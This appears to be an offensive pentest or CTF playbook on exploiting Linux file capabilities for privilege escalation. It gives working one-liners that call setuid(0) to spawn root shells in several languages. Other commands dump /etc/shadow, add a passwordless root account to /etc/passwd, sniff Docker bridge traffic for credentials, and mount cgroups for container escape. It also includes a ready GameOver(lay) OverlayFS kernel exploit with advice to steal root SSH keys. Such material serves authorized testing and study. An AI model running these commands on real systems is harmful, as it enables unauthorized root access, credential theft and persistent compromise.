# Linux Capabilities Exploitation

## When this applies

- Linux foothold; enumeration shows binaries with file capabilities (`getcap -r / 2>/dev/null`).
- Goal: abuse the granted capability for privesc, file read, packet sniffing, or container escape.

## Technique

File capabilities grant specific privileges to a binary independent of UID. Common high-value caps: `cap_setuid` (UID 0), `cap_dac_read_search` (read any file), `cap_dac_override` (write any file), `cap_net_raw` (packet capture), `cap_sys_admin` (mount/unmount).

## Steps

```bash
# Enumerate capabilities
getcap -r / 2>/dev/null

# cap_setuid — change UID to root
# Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
# Node.js
node -e 'process.setuid(0); require("child_process").execSync("/bin/bash",{stdio:"inherit"})'

# cap_dac_read_search — read any file
python3 -c 'print(open("/etc/shadow").read())'

# cap_dac_override — write any file (add root user)
python3 -c 'open("/etc/passwd","a").write("pwned::0:0::/root:/bin/bash\n")'
# Also: bypasses DAC for restricted /proc/sys writes. When the cap sits on a
# fixed-purpose binary (e.g. one that hardcodes a write to
# /proc/sys/fs/binfmt_misc/register), the binary itself becomes the privesc
# primitive — see binfmt_misc-suid-laundering.md.

# cap_net_raw — packet capture (credential sniffing, lateral movement)
# If tcpdump/python has cap_net_raw, sniff Docker bridge interfaces for plaintext creds
tcpdump -i br-$(docker network ls -q | head -1) -A 2>/dev/null | grep -iE 'user|pass|token|auth|key'
# Containers often exchange credentials in plaintext over bridge networks
# Check bridge interfaces: ip link show type bridge; brctl show

# cap_sys_admin — mount/unmount (container escape)
mount -t cgroup -o rdma cgroup /tmp/cgrp
```

**Reference**: https://gtfobins.github.io/ (filter by "Capabilities")

## GameOver(lay) — OverlayFS UID/Cap Mapping (CVE-2023-2640 + CVE-2023-32629)

Ubuntu kernels 6.2.x (22.04 + HWE, 23.04) ship an OverlayFS that fails to strip namespace-set capabilities when copy-up promotes a file from the lower to the upper layer. Combined with `unshare -r` (user-namespace root), this is a one-shot LPE:

```bash
# Detection: any unprivileged user, no extra deps
uname -a | grep -E "6\.2\.0-(2[0-9]|3[0-9])-generic"   # vulnerable line

# Exploit (one-liner — works on Ubuntu 22.04 stock):
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/ && \
  setcap cap_setuid+eip l/python3 && \
  mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && \
  touch m/python3" && \
  u/python3 -c 'import os;os.setuid(0);os.system("cat /root/root.txt")'
```

**Why it works:** `setcap` inside the user namespace sets file capabilities. Normal kernels strip those on copy-up because the cap was set with namespaced creds. The buggy 6.2 OverlayFS skips that strip, so the upper layer's `python3` keeps `cap_setuid` and runs as **real** root in the host namespace.

**Patched in:** Ubuntu 6.2.0-26.26+, 5.15-HWE backport. If the box is on a fixed kernel `cap_setuid` won't survive copy-up — fail-fast in seconds.

**Companion technique:** if `cap_setuid` doesn't survive, swap the payload to `cap_dac_read_search+ep` (read any file as the user namespace's "root") to grab `/root/.ssh/id_rsa` or `/etc/shadow` — works on a wider patch window.

## Verifying success

- Python/Perl/etc. one-liner returns a root shell or successfully reads `/etc/shadow`.
- `id` reports `euid=0(root)` or the read returns sensitive data.

## Common pitfalls

- `cap_setuid` on a binary inside a user namespace doesn't always survive copy-up — kernel-version-specific.
- `cap_dac_override` writes to `/etc/passwd` succeed but root login may need a shadow entry too — try adding to both files or use `chpasswd`.
- `cap_net_raw` requires the target traffic to be flowing — cron-driven service connections or cross-container chatter are best targets.

## Tools

- getcap
- python3, perl, ruby, node
- tcpdump
- unshare
